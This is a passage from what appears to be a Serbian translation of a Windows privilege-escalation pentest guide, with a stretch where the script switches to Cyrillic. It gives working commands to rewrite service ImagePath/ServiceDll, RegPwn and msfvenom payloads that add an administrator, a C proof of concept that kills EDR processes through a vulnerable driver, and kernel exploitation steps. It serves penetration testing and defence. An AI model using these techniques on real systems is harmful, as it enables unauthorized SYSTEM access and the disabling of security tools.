Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole registra koje omogućavaju upis u određeni ključ servisa. Sam ACL unos ne dokazuje da je pristup efektivno omogućen: važni su unosi za zabranu, trenutni token i nasleđene dozvole. Dozvole ključa registra odvojene su od dozvola objekta servisa `SERVICE_CHANGE_CONFIG` i `SERVICE_START`. Za eskalaciju su potrebni i upotrebljivo polje konfiguracije servisa, način da se servis pokrene i servisni identitet sa višim privilegijama. Pogledajte Microsoftove reference za [dozvole ključeva registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [dozvole pristupa servisima](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili putanju do binarne datoteke koju servis izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Trka sa registry symlinkom za proizvoljan upis vrednosti u HKLM (ATConfig)

Neke Windows funkcije pristupačnosti kreiraju **ATConfig** ključeve za svakog korisnika, koje proces sa privilegijama **SYSTEM** kasnije kopira u HKLM ključ sesije. **Trka sa simboličkim linkom** u registru može da preusmeri taj privilegovani upis na **bilo koju putanju u HKLM-u**, čime se dobija mogućnost proizvoljnog **upisa vrednosti** u HKLM.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: tastatura na ekranu `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane funkcije pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva konfiguraciju koju kontroliše korisnik.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijavljivanja ili prelazaka na bezbednu radnu površinu i korisnik može da ga menja.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Popunite vrednost u **HKCU ATConfig** koju želite da upiše proces SYSTEM.
2. Pokrenite kopiranje na bezbednu radnu površinu (npr. **LockWorkstation**), čime se pokreće AT broker tok.
3. **Dobijte trku** postavljanjem **oplocka** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite **HKLM Session ATConfig** ključ **registry linkom** ka zaštićenoj ciljnoj lokaciji u HKLM-u.
4. SYSTEM upisuje vrednost koju je odabrao napadač na preusmerenu putanju u HKLM-u.

Kada dobijete mogućnost proizvoljnog upisa vrednosti u HKLM, pređite na LPE tako što ćete prepisati vrednosti konfiguracije servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr. **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** tokom trke.

Primeri alata (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory u registru servisa

Ako imate ovu dozvolu nad registrom, to znači da **možete da kreirate podključeve u njemu**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ako putanja do izvršne datoteke nije stavljena pod navodnike, Windows će pokušati da izvrši svaki deo putanje koji se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Izlistajte sve necitirane putanje servisa, izuzimajući one koje pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti pomoću alata metasploit:** `exploit/windows/local/trusted\_service\_path` Možete ručno da napravite binarnu datoteku servisa pomoću alata metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se izvršiti ako usluga otkaže. Ova funkcija se može konfigurisati tako da pokazuje na binarnu datoteku. Ako se ta datoteka može zameniti, možda je moguća eskalacija privilegija. Više detalja nalazi se u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljevi skripti zakazanih zadataka

Za omogućen zadatak koji pokreće `cmd.exe /c` sa datotekom `.bat` ili `.cmd`, proverite skriptu navedenu u **argumentima akcije**, kao i `cmd.exe`. Isto važi za eksplicitni argument datoteke interpretera, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovan poziv PowerShell-a sa `-File`, proverite i ACL te navedene skripte; promenljive, uslovi i povezivanje komandi u shell-u zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje ukazuju na mogućnost izvršavanja između naloga samo ako se principal konfigurisanog zadatka razlikuje od pozivaoca i ako zadatak zaista dođe do te akcije. ACL koji dozvoljava samo dodavanje sadržaja može biti važan za skripte, ali raniji `exit` ili drugi tok kontrole može sprečiti izvršavanje naknadno dodatih linija. Pre nego što tvrdite da je moguća eskalacija, potvrdite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i smernice za kontrolu aplikacija. Popisivanje ne sme da menja skriptu niti da pokreće zadatak.

## Imenovani tokovi u dostupnim datotekama

U NTFS-u, čitljiva datoteka može da sadrži imenovani tok `:$DATA` čiji sadržaj nije prikazan u uobičajenom izlistavanju direktorijuma. Za mali, relevantan skup dostupnih rezervnih kopija ili konfiguracionih datoteka, pregledajte **imena i veličine** tokova pre otvaranja njihovog sadržaja; Windows im omogućava pristup preko [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell preko [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Ime toka koje sugeriše da sadrži tajnu samo je naznaka. Proverite efektivna prava čitanja datoteke, podršku sistema datoteka za tokove, da li tok sadrži upotrebljive akreditive i na koji se nalog oni zaista autentifikuju. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom rutinskog popisivanja.

## Ulazi pomoćnog programa Windows Driver Kit koji se izvršava po rasporedu

Opcionalni Windows Driver Kit sadrži `StandaloneRunner.exe`, koji može da koristi datoteke `command.txt`, `reboot.rsf` i projektnu datoteku `working\rsf.rsf` iz svog direktorijuma za izvršavanje. Zakazani zadatak ili usluga koja pokreće ovaj pomoćni program sa privilegovanim nalogom može da pretvori pristup za upisivanje sa niskim privilegijama u te ulazne datoteke u izvršavanje komandi u kontekstu tog naloga, čak i kada je sam izvršni fajl zaštićen. Potvrdite da privilegovani proces koristi ove datoteke i da se **obe** prateće datoteke mogu kreirati ili menjati; samo pronalaženje pomoćnog programa nije dovoljno.

Za zakazani zadatak pregledajte njegovu akciju [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) i ACL-ove putanja do obe prateće datoteke. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke je samo naznaka koju treba proveriti, a ne dokaz da zadatak odatle čita ulazne datoteke. Takođe mora biti ispunjen preduslov za projektnu radnu datoteku. Proverite stvarni principal zadatka, umesto da pretpostavite da se izvršava kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da zamenite neku od njih i eskalirate privilegije) i nad **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja za popravku Windows agenta Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Windows agente Checkmk koji su upisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od upisa kada zamena ne bi uspela. Dobavljač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite punu instaliranu verziju zakrpe i da li se zahvaćena operacija agenta može pokrenuti; oznaka grane, poput `2.1`, nije dovoljna da bi se utvrdilo da li je sistem izložen. Enumeracijom se mogu proveriti verzija, stanje usluge i dozvole za Temp bez kreiranja datoteka ili pokretanja agentskih komandi.

#### Provera usluge SAML u ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) utiče na ADSelfService Plus verzije 6210 i starije; dobavljač je ispravio problem u verziji 6211. Relevantan je samo ako je SAML SSO **omogućen sada ili je ranije bio omogućen**. Zato je zapis o instaliranom proizvodu ili putanja do usluge samo trag, a ne potvrda ranjivosti: proverite tačnu verziju, istoriju konfiguracije SAML-a, dostupnost usluge preko mreže i nalog pod kojim se ona pokreće. Izvršavanje koda kroz uslugu nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu pokrenutu kao SYSTEM. Čitljiva datoteka `OfflineBackup_*.ezip` u direktorijumu Backup proizvoda zaseban je trag o šifrovanoj rezervnoj kopiji, a ne dokaz da su dostupni upotrebljivi akreditivi ili da postoji ova SAML ranjivost. Tokom rutinske enumeracije zabeležite njenu putanju i prava pristupa, bez raspakivanja.

#### Granice Jenkins kontrolera i domenskog naloga

Na Windows Jenkins kontroleru razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins ih dokumentuje kao zasebna prava `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač mogu da pruže drugi način pokretanja izgradnje, ali proverite da li je omogućen i da li se izgradnja zaista izvršava. Izvršavanje koristi identitet kontrolera ili izabranog agenta, a sačuvani akreditivi mogu da se koriste samo ako im posao može pristupiti u okviru njihovog opsega. Zasebno proverite pristup metapodacima u `JENKINS_HOME`: Jenkins čuva материјал акредитива и кључеве за шифровање у `credentials.xml`, `secrets/hudson.util.Secret` и `secrets/master.key` ([Jenkinsovo skladištenje tajni](https://www.jenkins.io/doc/developer/security/secrets/)). Само њихово постојање не открива лозинку; проверите **приступ за читање потребних датотека** и засебну путању за поновну употребу налога, без исписивања тајни у дељеном излазу. Ако тај налог има AD дозволу за упис у `scriptPath` корисничког објекта, потврдите да је путања за упис доступна и да постоји стварна пријава или планирани процес који се покреће као циљни корисник, пре него што то третирате као извршавање између корисника. Додатну контролу групе треба потврдити засебном провером ефективних AD права.

#### Идентитет self-hosted агента Azure Pipelines

За пројекат Azure DevOps Server или Azure Pipelines раздвојте дозволу за **креирање или уређивање** pipeline-а од дозволе за његово **стављање у ред** и коришћење изабраног скупа агената; [Microsoft засебно документује дозволе за pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) и [овлашћивање скупа агената](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ако налог са нижим привилегијама може да пошаље скриптни корак и покрене тај pipeline на self-hosted Windows агенту, корак се извршава као [конфигурисани налог оперативног система агента](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Пре него што тврдите да долази до преласка на другог корисника или SYSTEM, проверите тачан pipeline, ограничења гране/ресурса, овлашћени скуп агената, покретљив посао и идентитет услуге агента. Инсталирани агент, улога у пројекту или дозвола за упис у репозиторијум сами по себи су само трагови; током пасивне enumeracije прегледајте дозволе и локалне метаподатке услуге, без покретања израде.

#### Акредитиви Microsoft Entra Connect Sync

[Microsoft прави разлику](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) између **налога услуге ADSync**, који покреће услугу синхронизације и приступа њеној SQL бази података, и **налога AD DS конектора**, чије дозволе у директоријуму зависе од конфигурисаних функција синхронизације. Акредитиви конектора чувају се шифровани у тој бази података, а материјал кључа је [заштићен помоћу DPAPI под налогом услуге ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Инсталирана услуга синхронизације, група чији назив наговештава локалне администраторске привилегије или сам приступ бази података не доказују да су акредитиви дешифрујући нити да је могуће ескалирати привилегије у домену. Засебно проверите стварна права читања базе података, приступ налога услуге/кључа, распоред инсталације и SQL-а, конфигурисани идентитет конектора и ефективне AD привилегије тог идентитета. Рутинска enumeracija треба да приказује само метаподатке услуге и приступа, а не да упитује или исписује сачуване тајне.

#### Дозволе за DLL-ове за подршку управљачких програма штампача

Инсталирани управљачки програм штампача може да чува DLL-ове за подршку у `C:\ProgramData` и да их учитава у привилегованији процес штампања. Проверите ACL-ове тачног директоријума управљачког програма и DLL-ова, укључујући надређене директоријуме и reparse тачке, чак и ако је enumeracija штампача преко WMI-ја забрањена. За [проблем са Ricoh управљачким програмом штампача CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), пријављена путања је била `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [првобитно објављивање](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) описује учитавање DLL-а од стране `PrintIsolationHost.exe`. ACL који дозвољава упис само је траг: проверите ефективан приступ упису након ставки одбијања, да ли је релевантни управљачки програм инсталиран и учитава ли датотеку под привилегованим идентитетом, као и да ли је добављач ажурираним управљачким програмом или безбедносним програмом отклонио проблем у инсталацији. Не закључујте да постоји рањивост само на основу назива директоријума или верзије управљачког програма.

### Дозволе за упис

Проверите да ли можете да измените неку конфигурациону датотеку како бисте прочитали неку посебну датотеку или да ли можете да измените неки бинарни фајл који ће извршити налог Administrator (schedtasks).

Слабe дозволе за директоријуме/датотеке у систему можете да пронађете на следећи начин:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Postojanost/izvršavanje putem automatskog učitavanja pluginova u Notepad++

Notepad++ automatski učitava sve DLL-ove za pluginove koji se nalaze u njegovim podfolderima `plugins`. Ako postoji instalacija prenosive verzije/kopije u koju se može pisati, ubacivanje zlonamernog plugina omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući izvršavanje iz `DllMain` i callback funkcija plugina).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri pokretanju

**Proverite da li možete da prepišete neki registar ili binarnu datoteku koju će pokrenuti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **lokacijama za automatsko pokretanje radi eskalacije privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite moguće **čudne ili ranjive drajvere trećih strana**.

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako driver izlaže primitiv za proizvoljno čitanje/pisanje iz kernela (često kod loše projektovanih IOCTL rukovalaca), možete eskalirati privilegije direktnom krađom SYSTEM tokena iz kernel memorije.<sup>[[13]](#references)</sup> Tehniku korak po korak pogledajte ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Povezani materijali o Windows kernel exploitation-u:

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kod race-condition grešaka, kada ranjivi poziv otvara putanju Object Manager-a pod kontrolom napadača, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih nizova direktorijuma) može produžiti vremenski prozor sa nekoliko mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### UAF-ovi u cancel-safe queue, otkrivanje podataka iz paged-pool-a i I/O ring pivoti

Neki Windows kernel LPE lanci mogu se izgraditi od dve zasebno slabe greške: **race condition-a u životnom ciklusu cancel-safe queue-a** koji oslobađa zahtev/CBD dok je zaključavanje reda i dalje aktivno, i otkrivanja podataka usled **oslobađanja zaključavanja pre kopiranja**, koje otkriva oslobođenu alokaciju iz paged-pool-a tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Napomene za proveru koda i exploitation:

- **Oslobađanje pod zaključavanjem + naknadno otkazivanje**: tražite putanju uspeha koja radi **Acquire -> CompleteRequest/free -> Release**, dok putanja otkazivanja radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako putanja uspeha stigne do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre otpuštanja CBDQ/CSQ zaključavanja, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije da nastavi i prosledi oslobođeni `PFLT_CALLBACK_DATA` nazad u callback funkciju driver-a za uklanjanje.
- **Ponovo iskoristite oslobođeni objekat reda** pomoću alokacije из paged-pool-a iste veličine, čiji sadržaj kontroliše napadač. `NPFS` Data Queue Entries su korisni jer možete da kontrolišete sadržaj i veličinu, a zatim da ih proverite pipe read/peek operacijama. Ako oslobođeni objekat sadrži linkove liste, prepišite ih **cikličnom listom lažnih čvorova zahteva u korisničkoj memoriji**, tako da driver više puta obrađuje strukture zahteva koje kontroliše napadač umesto da se zaustavi na početku originalne liste.
- **Nadogradite predvidljivo upisivanje**: ako lažni zahtev preusmeri ugnježdeni context pointer koji se koristi za upise pri vođenju evidencije (vremenske oznake / QPC / polja pored refcount-a), možda ćete dobiti upis u kernel memoriju čiju **adresu, ali ne i vrednost, možete da kontrolišete**. U tom slučaju ciljajte polje **length/size** objekta iz pool spray-a umesto konačnog pokazivača na kod/podatke, pa pretražite spray dok oštećeni objekat ne omogući **čitanje van granica iz paged-pool-a**.
- **Obrazac otkrivanja podataka koji se može iskoristiti kroz race condition**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se poboljšava kada napadač može da poveća bafer koji se kopira (na primer, dodavanjem mnogo unosa u listu/resurse koji povećavaju konačnu veličinu alokacije serializer-a), jer duže kopiranje proširuje prozor za zamenu bez nužnog rušenja sistema.
- **Ciljevi za dopunu sa mnogo pokazivača**: registrovani baferi u Windows **I/O ring-u** odlični su ciljevi za otkrivanje podataka jer se veličina njihove alokacije iz paged-pool-a može kontrolisati (`8 * regBufferCnt`), a svaki element je kernel pokazivač na `_IOP_MC_BUFFER_ENTRY`. Otkrijte jedan od ovih nizova, pronađite okolni `IORING_OBJECT`, a zatim oštetite **`RegBuffers`** i **`RegBuffersCount`** kako bi naredne I/O ring operacije koristile lažne unose pod kontrolom napadača i omogućile proizvoljno čitanje/pisanje iz kernela. Ako je jedini dostupan upis stabilan bajt (na primer, iz `KUSER_SHARED_DATA+0x14`), koristite **preklapajuće neporavnate upise** da biste napravili korisnički pokazivač koji se ponavlja, kao što je `0x0101010101010101`, mapirajte ga pomoću `VirtualAlloc` i smestite tamo lažni niz registrovanih bafera.<sup>[[30]](#references)</sup>

Korisni pokazatelji za otklanjanje grešaka:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada iz korumpiranog I/O ring-a dobijete proizvoljno čitanje/pisanje kernela, ukradite SYSTEM token standardnim postupkom nakon dobijanja primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitive za korupciju memorije hive-a registra

Savremene ranjivosti hive-ova omogućavaju vam da pripremite determinističke rasporede memorije, zloupotrebite upisive potomke HKLM/HKU i pretvorite korupciju metapodataka u prekoračenja kernel paged-pool-a bez prilagođenog drajvera. Ovde saznajte ceo lanac:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Zabuna tipova u direct režimu funkcije `RtlQueryRegistryValues` zbog putanja koje kontroliše napadač

Neki drajveri prihvataju putanju registra iz userland-a, proveravaju samo da li je to ispravan UTF-16 niz, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i odredištem na steku, kao što je skalar `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se tumači prema **stvarnom** tipu registra, a ne prema tipu koji je programer očekivao.

Ovo stvara dve korisne primitive:<sup>[[24]](#references)[[25]](#references)</sup>

- **Zabuna oko delegiranih ovlašćenja / oracle**: apsolutna putanja `\Registry\...` koju kontroliše korisnik omogućava drajveru da upituje ključeve koje odabere napadač, otkrije njihovo postojanje preko povratnih kodova/zapisa i ponekad pročita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Korupcija kernel memorije**: odredište skalarnog tipa, kao što je `&readValue`, može biti pogrešno protumačeno kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa vrednosti registra.

Napomene za praktičnu eksploataciju:

- **Ublažavanje ranjivosti u Windows 8+**: ako upit pogodi **nepouzdani hive** uz `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, pozivi iz kernela dovode do pada sa greškom `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da bi ranjivost ostala iskoristiva, tražite **ključeve u pouzdanim sistemskim hive-ovima u koje napadač može da upisuje**, umesto da postavljate vrednosti u `HKCU`.
- **Priprema u pouzdanom hive-u**: koristite NtObjectManager da nabrojite potomke `\Registry\Machine` u koje može da se upisuje, pa ponovo pokrenite skeniranje sa dupliranim tokenom **niskog integriteta**, да бисте пронашли кључеве доступне из sandbox-ованих контекста:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u `int` od 4 bajta oštećuje susedne podatke na stack-u i može delimično da prepiše obližnji callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod najpre učita `REG_DWORD` pod kontrolom napadača u skalarni podatak na stack-u, a zatim ponovo iskoristi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: za velike binarne podatke, direct režim tretira prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi negativnu vrednost pod kontrolom napadača u ponovo iskorišćenom skalaru, sledeći upit `REG_BINARY` kopira bajtove napadača direktno preko susednih slotova na stack-u, što je često najjednostavniji način da se u potpunosti prepiše callback pointer.

Obrazac koji vredi tražiti: **heterogena čitanja iz registry-ja u istu promenljivu na stack-u bez ponovne inicijalizacije**. Pretražite `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo iskorišćene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje iz registry-ja određuje da li će doći do drugog čitanja.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na device objektima (LPE + EDR kill)

Neki potpisani drajveri trećih strana kreiraju svoj device object sa strogim SDDL-om koristeći IoCreateDeviceSecure, ali zaborave da podese FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, bezbedni DACL se ne sprovodi kada se uređaju pristupa putanjom koja sadrži dodatnu komponentu, pa svaki neprivilegovani korisnik može da dobije handle koristeći putanju namespace-а kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz primera iz stvarnog sveta)

Kada korisnik može da otvori uređaj, privileged IOCTL-ovi koje drajver izlaže mogu da se zloupotrebe za LPE i neovlašćene izmene. Primeri mogućnosti uočenih u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell preko DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/upisivanje sirovog diska (neovlašćene izmene van mreže, trikovi za postojanost pri pokretanju sistema).
- Prekidanje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), što omogućava AV/EDR kill iz user land-a preko kernela.

Minimalni obrazac PoC-a (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mere ublažavanja za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koji treba da budu ograničeni pomoću DACL-a.
- Proveravajte kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite prekidanje procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite modele sa brokerom umesto direktnih privilegija na nivou kernela.

Ideje za detekciju za odbrambene timove
- Nadgledajte otvaranje sumnjivih naziva uređaja iz korisničkog režima (npr. \\ .\\amsdk*) i određene IOCTL sekvence koje ukazuju na zloupotrebu.
- Sprovodite Microsoft-ovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/zabranjenih stavki.


## PATH DLL Hijacking

Ako imate **dozvole za pisanje u fascikli koja se nalazi u PATH-u**, možda ćete moći da hijack-ujete DLL koji učitava proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle u PATH-u:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako zloupotrebiti ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking putem `C:\node_modules`

Ovo je varijanta **Windows uncontrolled search path** koja utiče na aplikacije **Node.js** i **Electron** kada izvršavaju običan import kao što je `require("foo")`, a očekivani modul **nedostaje**.<sup>[[20]](#references)</sup>

Node traži pakete krećući se naviše kroz stablo direktorijuma i proveravajući fascikle `node_modules` u svakom nadređenom direktorijumu. U Windows-u ta pretraga može da dođe do korena diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može da proverava sledeće lokacije:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
